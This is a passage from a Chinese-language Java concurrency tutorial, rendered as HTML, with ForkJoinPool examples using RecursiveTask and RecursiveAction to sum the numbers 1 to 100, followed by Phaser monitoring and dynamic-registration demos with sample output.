<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ForkJoinTask</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">RecursiveTask</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">IntStream</span></span><span class="token punctuation">;</span>

<span class="token comment">/**
 * @author: DH
 * @date: 2022/6/20
 * @desc:
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RecursiveTaskDemo</span> <span class="token punctuation">{</span>
    <span class="token comment">// 可执行容量</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">TASK_CAPACITY</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">ForkJoinPool</span> forkJoinPool <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ForkJoinPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ForkJoinTask</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> future <span class="token operator">=</span> forkJoinPool<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CalculateRecursiveTask</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"================== other tasks ===================="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"================== action results "</span> <span class="token operator">+</span> future<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ExecutionException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
            forkJoinPool<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 计算</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">CalculateRecursiveTask</span> <span class="token keyword">extends</span> <span class="token class-name">RecursiveTask</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> start<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> end<span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token class-name">CalculateRecursiveTask</span><span class="token punctuation">(</span><span class="token keyword">int</span> start<span class="token punctuation">,</span> <span class="token keyword">int</span> end<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>end <span class="token operator">&gt;=</span> start<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>start <span class="token operator">=</span> start<span class="token punctuation">;</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>end <span class="token operator">=</span> end<span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>end <span class="token operator">=</span> start<span class="token punctuation">;</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>start <span class="token operator">=</span> end<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">protected</span> <span class="token class-name">Integer</span> <span class="token function">compute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>end <span class="token operator">-</span> start <span class="token operator">&lt;=</span> <span class="token constant">TASK_CAPACITY</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// 执行任务</span>
                <span class="token keyword">return</span> <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token comment">// 拆分任务</span>
                <span class="token keyword">int</span> middle <span class="token operator">=</span> <span class="token punctuation">(</span>end <span class="token operator">+</span> start<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
                <span class="token class-name">CalculateRecursiveTask</span> taskLeft <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CalculateRecursiveTask</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> middle<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">CalculateRecursiveTask</span> taskRight <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CalculateRecursiveTask</span><span class="token punctuation">(</span>middle <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// 加入ForkJoinPool.WorkQueue </span>
                taskLeft<span class="token punctuation">.</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// 加入ForkJoinPool.WorkQueue </span>
                taskRight<span class="token punctuation">.</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token comment">// 等待任务执行完成并返回</span>
                <span class="token keyword">return</span> taskLeft<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> taskRight<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="RecursiveAction：无返回">RecursiveAction：无返回</h2>
<p>如果有返回值，需要构造一个共同访问区域。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Optional</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ForkJoinPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">RecursiveAction</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">TimeUnit</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span></span><span class="token class-name">AtomicInteger</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">IntStream</span></span><span class="token punctuation">;</span>

<span class="token comment">/**
 * @author: DH
 * @date: 2022/6/20
 * @desc:
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RecursiveActionDemo</span> <span class="token punctuation">{</span>
    <span class="token comment">//  线程共享</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">AtomicInteger</span> <span class="token constant">SUM_RESULT</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 可执行容量</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">TASK_CAPACITY</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">ForkJoinPool</span> forkJoinPool <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ForkJoinPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            forkJoinPool<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CalculateRecursiveActon</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>forkJoinPool<span class="token punctuation">.</span><span class="token function">getActiveThreadCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// 等待执行完成</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>forkJoinPool<span class="token punctuation">.</span><span class="token function">getActiveThreadCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spend</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">NANOSECONDS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token constant">SUM_RESULT</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ifPresent</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
            forkJoinPool<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">CalculateRecursiveActon</span> <span class="token keyword">extends</span> <span class="token class-name">RecursiveAction</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> start<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> end<span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token class-name">CalculateRecursiveActon</span><span class="token punctuation">(</span><span class="token keyword">int</span> start<span class="token punctuation">,</span> <span class="token keyword">int</span> end<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>end <span class="token operator">&gt;=</span> start<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>start <span class="token operator">=</span> start<span class="token punctuation">;</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>end <span class="token operator">=</span> end<span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>end <span class="token operator">=</span> start<span class="token punctuation">;</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>start <span class="token operator">=</span> end<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

        <span class="token punctuation">}</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">compute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>end <span class="token operator">-</span> start <span class="token operator">&lt;=</span> <span class="token constant">TASK_CAPACITY</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token constant">SUM_RESULT</span><span class="token punctuation">.</span><span class="token function">getAndAdd</span><span class="token punctuation">(</span><span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">int</span> middle <span class="token operator">=</span> <span class="token punctuation">(</span>end <span class="token operator">+</span> start<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
                <span class="token comment">// 任务拆分</span>
                <span class="token class-name">CalculateRecursiveActon</span> left <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CalculateRecursiveActon</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> middle<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">CalculateRecursiveActon</span> right <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CalculateRecursiveActon</span><span class="token punctuation">(</span>middle <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// 任务入池</span>
                left<span class="token punctuation">.</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                right<span class="token punctuation">.</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>Phaser</h1>
<h2 id="监控方法">监控方法</h2>
<ul>
<li><code>public int getRegisteredParties()</code>返回在当前phase上注册的party数目</li>
<li><code>public int getArrivedParties()</code>返回已经到达当前phase的party的数量，如果这个phaser已经终止，返回值是无意义和任意的</li>
<li><code>public int getUnarrivedParties()</code>返回还未到达当前phase的party的数量，如果这个phaser已经终止，返回值是无意义和任意的</li>
<li><code>public final int getPhase()</code>返回当前阶段号, 最大值是Integer.MAX_VALUE，到达最大值之后，从0重新计数</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PhaserExample4</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">Phaser</span> phaser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phaser</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        phaser<span class="token punctuation">.</span><span class="token function">bulkRegister</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"phaser.getRegisteredParties"</span><span class="token punctuation">,</span> phaser<span class="token punctuation">.</span><span class="token function">getRegisteredParties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"phaser.getArrivedParties"</span><span class="token punctuation">,</span> phaser<span class="token punctuation">.</span><span class="token function">getArrivedParties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>phaser<span class="token operator">::</span><span class="token function">arriveAndAwaitAdvance</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"phaser.getArrivedParties"</span><span class="token punctuation">,</span> phaser<span class="token punctuation">.</span><span class="token function">getArrivedParties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"phaser.getUnarrivedParties"</span><span class="token punctuation">,</span> phaser<span class="token punctuation">.</span><span class="token function">getUnarrivedParties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token class-name">String</span> item<span class="token punctuation">,</span> <span class="token class-name">Object</span> object<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"【%s】【monitor-%d】【%30s】%s\n"</span><span class="token punctuation">,</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> index<span class="token punctuation">,</span> item<span class="token punctuation">,</span> object<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="动态注册特性">动态注册特性</h2>
<p><code>public int register()</code> 动态注册</p>
<p><code>public int bulkRegister(int parties)</code>批量注册</p>
<p><code>public int arriveAndAwaitAdvance()</code> 类似CyclicBarrier 的await方法</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">practice<span class="token punctuation">.</span>common<span class="token punctuation">.</span></span><span class="token class-name">TaskFactory</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Phaser</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">TimeUnit</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">IntStream</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PhaserExample1</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">Phaser</span> phaser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phaser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">boxed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>i <span class="token operator">-&gt;</span> phaser<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token class-name">Task</span><span class="token operator">::</span><span class="token keyword">new</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"【BEGIN-RegisteredParties】"</span> <span class="token operator">+</span> phaser<span class="token punctuation">.</span><span class="token function">getRegisteredParties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 注册main线程</span>
        phaser<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 到达并且等待前行</span>
        phaser<span class="token punctuation">.</span><span class="token function">arriveAndAwaitAdvance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 等待所有线程全部到达隔离点之后执行</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"【END-RegisteredParties】"</span> <span class="token operator">+</span> phaser<span class="token punctuation">.</span><span class="token function">getRegisteredParties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"【"</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" 】 all threads finished the work."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"【other work】"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Task</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token class-name">Phaser</span> phaser<span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token class-name">Task</span><span class="token punctuation">(</span><span class="token class-name">Phaser</span> phaser<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>phaser <span class="token operator">=</span> phaser<span class="token punctuation">;</span>
            <span class="token comment">// 动态追加party</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>phaser<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spend</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"：finished and continue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 到达并且等待前行</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>phaser<span class="token punctuation">.</span><span class="token function">arriveAndAwaitAdvance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">2</span>：finished and <span class="token keyword">continue</span>
<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">3</span>：finished and <span class="token keyword">continue</span>
<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">4</span>：finished and <span class="token keyword">continue</span>
<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>：finished and <span class="token keyword">continue</span>
<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>：finished and <span class="token keyword">continue</span>
【<span class="token constant">END</span><span class="token operator">-</span><span class="token class-name">RegisteredParties</span>】<span class="token number">6</span>
【main 】 all threads finished the work<span class="token punctuation">.</span>
【other work】<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
